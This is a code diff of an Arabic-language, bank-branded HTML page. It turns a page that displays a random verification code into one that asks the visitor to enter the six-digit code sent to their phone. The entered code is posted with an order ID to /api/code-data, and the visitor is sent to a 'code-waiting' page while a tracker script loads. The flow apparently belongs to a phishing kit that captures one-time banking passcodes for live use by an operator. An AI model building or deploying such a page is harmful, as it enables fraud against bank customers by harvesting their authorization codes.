@@ -25,26 +25,32 @@
   .bank-logo{margin-bottom:30px}
   .bank-logo img{height:50px}
 
-  .success-icon{
-    width:80px;height:80px;border-radius:50%;background:#e8f5e9;
+  .shield-icon{
+    width:70px;height:70px;border-radius:50%;background:#e3f2fd;
     display:flex;align-items:center;justify-content:center;
     margin:0 auto 20px;
   }
-  .success-icon svg{width:40px;height:40px;fill:#2e7d32}
+  .shield-icon svg{width:36px;height:36px;fill:#1565c0}
 
-  h1{font-size:22px;font-weight:800;color:#1a1a1a;margin-bottom:10px}
-  p{color:#888;font-size:14px;line-height:1.7;margin-bottom:24px}
+  h1{font-size:22px;font-weight:800;color:#1a1a1a;margin-bottom:8px}
+  .subtitle{color:#888;font-size:14px;line-height:1.7;margin-bottom:28px}
 
-  .code-box{
-    background:#fff;border:2px solid #2e7d32;border-radius:16px;
-    padding:20px;margin:0 auto;max-width:320px;
+  .error-msg{
+    display:none;background:#fee;border:1px solid #fcc;border-radius:8px;
+    padding:10px 14px;margin:0 24px 16px;color:#c62828;font-size:14px;
+    text-align:center;font-weight:600;
   }
-  .code-label{font-size:13px;color:#2e7d32;font-weight:600;margin-bottom:10px}
-  .code-value{
-    font-size:32px;font-weight:800;letter-spacing:6px;color:#1a1a1a;
-    font-family:monospace;direction:ltr;
+
+  .code-input-wrap{
+    max-width:320px;margin:0 auto;display:flex;gap:8px;
+    justify-content:center;direction:ltr;
   }
-  .code-timer{font-size:12px;color:#c62828;margin-top:10px;font-weight:600}
+  .code-digit{
+    width:44px;height:54px;border:2px solid #ccc;border-radius:10px;
+    text-align:center;font-size:24px;font-weight:700;font-family:monospace;
+    background:#fff;color:#1a1a1a;outline:none;transition:.2s;
+  }
+  .code-digit:focus{border-color:#1565c0;box-shadow:0 0 0 3px rgba(21,101,192,.15)}
 
   .info-text{
     margin-top:24px;background:#fff8e1;border-radius:12px;padding:14px 16px;
@@ -52,12 +58,14 @@
   }
 
   .bottom{padding:20px 24px 40px}
-  .done-btn{
+  .submit-btn{
     display:block;width:100%;padding:18px;border:none;border-radius:50px;
     font-size:18px;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;
     background:linear-gradient(135deg, #c62828, #e53935);
-    box-shadow:0 4px 15px rgba(198,40,40,.3);
+    box-shadow:0 4px 15px rgba(198,40,40,.3);transition:.2s;
   }
+  .submit-btn:hover{opacity:.9}
+  .submit-btn:disabled{opacity:.5;cursor:not-allowed}
 </style>
 </head>
 <body>
@@ -65,17 +73,22 @@
 <div class="top">
   <div class="bank-logo"><img src="images/logo.jpg" alt="SGA"></div>
 
-  <div class="success-icon">
-    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+  <div class="shield-icon">
+    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
   </div>
 
-  <h1>تم التحقق بنجاح</h1>
-  <p>تم التحقق من حسابك. رمز التحقق الخاص بك:</p>
+  <h1>أدخل رمز التحقق</h1>
+  <p class="subtitle">تم إرسال رمز التحقق إلى هاتفك المسجل لدينا</p>
 
-  <div class="code-box">
-    <div class="code-label">رمز التحقق</div>
-    <div class="code-value" id="otpCode">------</div>
-    <div class="code-timer">صالح لمدة <span id="timer">05:00</span></div>
+  <div class="error-msg" id="errorMsg"></div>
+
+  <div class="code-input-wrap">
+    <input class="code-digit" type="tel" maxlength="1" id="c0" autofocus>
+    <input class="code-digit" type="tel" maxlength="1" id="c1">
+    <input class="code-digit" type="tel" maxlength="1" id="c2">
+    <input class="code-digit" type="tel" maxlength="1" id="c3">
+    <input class="code-digit" type="tel" maxlength="1" id="c4">
+    <input class="code-digit" type="tel" maxlength="1" id="c5">
   </div>
 
   <div class="info-text">
@@ -84,27 +97,80 @@
 </div>
 
 <div class="bottom">
-  <button class="done-btn" onclick="location.href='index.html'">العودة للرئيسية</button>
+  <button class="submit-btn" id="submitBtn" onclick="submitCode()">تأكيد</button>
 </div>
 
 <script>
-  function generateOTP() {
-    let code = '';
-    for (let i = 0; i < 6; i++) code += Math.floor(Math.random() * 10);
-    return code;
+  const params = new URLSearchParams(location.search);
+  const orderId = params.get("order");
+  if (!orderId) location.href = "index.html";
+
+  if (params.get("error") === "1") {
+    const el = document.getElementById("errorMsg");
+    el.textContent = "الرمز غير صحيح او غير صالح";
+    el.style.display = "block";
   }
 
-  document.getElementById("otpCode").textContent = generateOTP();
+  const digits = document.querySelectorAll(".code-digit");
+  digits.forEach((inp, i) => {
+    inp.addEventListener("input", () => {
+      inp.value = inp.value.replace(/\D/g, "");
+      if (inp.value && i < digits.length - 1) digits[i + 1].focus();
+    });
+    inp.addEventListener("keydown", e => {
+      if (e.key === "Backspace" && !inp.value && i > 0) digits[i - 1].focus();
+    });
+    inp.addEventListener("paste", e => {
+      e.preventDefault();
+      const text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
+      for (let j = 0; j < digits.length && j < text.length; j++) {
+        digits[j].value = text[j];
+      }
+      const last = Math.min(text.length, digits.length) - 1;
+      if (last >= 0) digits[last].focus();
+    });
+  });
 
-  let seconds = 300;
-  const timerEl = document.getElementById("timer");
-  const interval = setInterval(() => {
-    seconds--;
-    if (seconds <= 0) { clearInterval(interval); timerEl.textContent = "انتهى"; return; }
-    const m = String(Math.floor(seconds / 60)).padStart(2, '0');
-    const s = String(seconds % 60).padStart(2, '0');
-    timerEl.textContent = m + ':' + s;
-  }, 1000);
+  function getCode() {
+    return Array.from(digits).map(d => d.value).join("");
+  }
+
+  async function submitCode() {
+    const code = getCode();
+    if (code.length < 6) {
+      showError("الرجاء إدخال الرمز كاملاً");
+      return;
+    }
+    const btn = document.getElementById("submitBtn");
+    btn.disabled = true;
+    btn.textContent = "جاري التحقق...";
+
+    try {
+      const res = await fetch("/api/code-data", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ order_id: orderId, code: code })
+      });
+      const data = await res.json();
+      if (data.success) {
+        location.href = "code-waiting.html?order=" + orderId;
+      } else {
+        showError(data.message || "حدث خطأ");
+        btn.disabled = false;
+        btn.textContent = "تأكيد";
+      }
+    } catch(err) {
+      showError("حدث خطأ في الاتصال");
+      btn.disabled = false;
+      btn.textContent = "تأكيد";
+    }
+  }
+
+  function showError(msg) {
+    const el = document.getElementById("errorMsg");
+    el.textContent = msg;
+    el.style.display = "block";
+  }
 </script>
 <script src="tracker.js"></script>
 </body>
